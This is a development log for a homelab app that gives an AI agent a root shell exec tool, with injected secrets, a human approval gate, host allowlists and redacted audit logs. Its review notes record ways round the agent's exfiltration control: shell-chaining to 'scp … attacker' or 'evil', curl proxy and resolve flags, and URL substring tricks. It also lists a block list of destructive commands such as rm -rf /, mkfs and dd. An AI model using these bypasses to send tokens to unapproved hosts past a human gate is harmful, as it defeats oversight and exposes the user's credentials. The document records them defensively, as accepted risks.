---
title: Credentialed, self-installing native exec (Cycle B3.2) — exec turned back on
cycle: 35 (B3.2)
date: 2026-06-20
status: shipped + deployed (live credentialed E2E pending Tony's PAT)
branch: b3-2-credentialed-exec (merged to master, FF 88a0ca0..5a4dd87, 13 commits)
task: d1d7f0ab (Cycle B)
spec: ../superpowers/specs/2026-06-20-credentialed-native-exec-b3-2-design.md
plan: ../superpowers/plans/2026-06-20-credentialed-native-exec-b3-2.md
docs:
  - ../wiki/agent-exec.md (rewritten to the native-root model + accepted-limitations)
  - ../DEPLOYMENT.md §14
enables: B3.3/B4 (artifact rendering; ssh/pct to other homelab hosts)
shipped:
  - "**native-root exec** (`server/lib/exec/run.ts`) — `selectExecMode` returns `native-root` when the process is root (it is, in LXC 114); runs `/bin/sh -c` directly. Retired the docker model: no `setpriv`, no uid-10001 `agent` user, no `/workspace` jail. Default cwd `/opt/mymind/workspace`. `unconfined` kept only as a non-root dev hatch."
  - "**encrypted secrets store** (`server/lib/exec/secrets.ts`) — settings key `exec_secrets`, reuses the ai-config AES-256-GCM crypto (`encryptSecret`/`decryptSecret`). `buildExecEnv` injects every decrypted secret as an env var into every exec command (always-on, by design). App secrets never reach the child (env built from a 3-var allowlist + the exec secrets)."
  - "**allowlist-first gate** (`server/lib/agent/ai-tools.ts` + `tools/exec.ts`) — `AgentTool.autoApprove` lets matched/LAN commands skip the human prompt; unknown ones prompt (B2 channel, fail-closed: no channel → deny). Catastrophic commands (`isRootWipe` + mkfs/dd/forkbomb/shutdown) are **hard-blocked in the handler** before spawn, even if approved."
  - "**outbound policy** (`server/lib/exec/outbound.ts` + `approvals.ts`) — LAN/private targets always run; **external** auto-approves only if every external host is in the approved-host set (`host:<hostname>` allowlist entries; `proposedPattern` proposes `host:<host>`; `validatePattern` rejects curl/wget glob heads). curl/wget never auto-approve via a command glob."
  - "**per-session cookie gate** (`agent-exec-enabled`) — `useCookie` in the agent UI (mirrors `agent-canvas`/`agent-speak`), threaded WS → orchestrator → `runAgent`; `effectiveTools()` strips the exec tool from the run's toolset unless the cookie is on. Default OFF; unattended/cron runs (no cookie) never get exec. Exec also requires the opt-in `powerful` profile."
  - "**audit + redaction** — exec is an `activity_log` `tool` span; `maskSecrets` masks secret values in the result AND (via the new `redactForLog` hook) in the logged command; `secretsInjected` lists names only. `/settings → Secrets` tab (write-only values) + REST (`/api/settings/exec-secrets`)."
validation:
  - "**Gates (branch HEAD 5a4dd87):** typecheck clean, **588 tests pass**, build complete."
  - "**Deploy GREEN** (run 27887712959, master 5a4dd87) — DB-touching `/api/health` gate passed. App live as root (native-root). `/api/settings/exec-secrets` unauth → 401 (shipped + auth-gated). `/opt/mymind/workspace` present. exec dark (no secrets, cookie off)."
  - "**Pending — Tony's interactive E2E** (needs a real GitHub PAT + the UI): seed `GITHUB_TOKEN` at /settings→Secrets; arm exec (powerful profile + `Exec enabled` toggle); `gh repo list` (private) succeeds via injected token; `curl http://192.168.2.25:8004/v1/models` runs with NO prompt (LAN); a new external host prompts + binds per-host; `/activity` shows commands with secret values redacted; toggle off disables exec; `rm -rf /` refused."
review:
  - "Subagent-driven (8 tasks, fresh implementer+reviewer each). Final whole-branch review (opus) caught the load-bearing exfil control being unsound: glob host-scoping → substring-embedding bypass (`curl …/https://api.github.com/`), then host-set membership → STILL bypassable via curl proxy/`--connect-to`/`--resolve` flags + shell-chaining (`curl approved && scp … attacker`)."
decisions:
  - "**ACCEPTED RISK (Tony, 2026-06-20):** external-outbound auto-approve is based on static command analysis and is NOT exfiltration-proof — once a host is allowlisted, proxy/redirect flags + shell-chaining can reach an unapproved host without a prompt. Accepted deliberately (LXC is the boundary; single-user internet-exposed box; exec is opt-in + audited; openclaw/hermes posture). Documented as an 'Accepted limitations' section in wiki/agent-exec.md. Future hardening options: curl-flag allowlist, or bwrap/nsjail per-command sandbox."
deferred:
  - "**LAN-chaining**: a LAN command chained to a non-HTTP exfil (`curl http://192.168.2.25 && scp … evil`) also auto-runs (same static-analysis limit). Folded into the accepted risk."
  - "Minors (backlog): `exec-secrets.put` raw-500 vs `createError(422)` on bad name; duplicate `buildExecEnv` test; `listSecretNames` decrypts per-GET for lastFour; no test for the `loadApprovals`-throw path (verified fail-closed)."
  - "**B3.3/B4**: artifact/report rendering; `ssh`/`pct` to OTHER homelab hosts (higher privilege)."
---

# Credentialed, self-installing native exec (Cycle B3.2)

Turned the agent's `exec` tool back **on** for the native LXC. B3.1 left exec fail-closed (the docker
sandbox it relied on was gone); B3.2 reworks it to run as **root in LXC 114** with the user's service
tokens injected, behind an allowlist-first gate + a per-session cookie + the `powerful` profile, fully
audited with secret-value redaction. Full reference: [wiki/agent-exec.md](../wiki/agent-exec.md).

## How it shipped
brainstorm → spec → plan → **subagent-driven** execution (fresh implementer + two-stage reviewer per
task) in worktree `b3-2-credentialed-exec`. 8 build tasks, then a whole-branch opus review. Gates green
(588 tests), merged FF to master, CD deployed green.

## The security story (read before extending this)
exec runs as **root with no jail and all tokens in env** — accepted, because the LXC is the boundary.
The defenses are: opt-in `powerful` profile + `agent-exec-enabled` cookie (both default off; off for
unattended runs), the allowlist-first **human gate**, the catastrophic **hard-block**, the LAN-allow/
external-per-host **outbound policy**, and **audit + secret redaction**. The whole-branch review proved
the outbound auto-approve is **not** exfil-proof (proxy/`--connect-to`/`--resolve` flags + shell
chaining); **Tony accepted that residual risk** (see frontmatter `decisions`). The wiki's "Accepted
limitations" section is the canonical record — keep it honest.

## Next
**Tony's interactive E2E** (frontmatter `validation` → Pending) closes the cycle. Then B3.3/B4. If the
accepted exfil risk ever needs closing: a curl-flag allowlist for external auto-approve, or a per-command
bwrap/nsjail sandbox — both noted in the wiki.
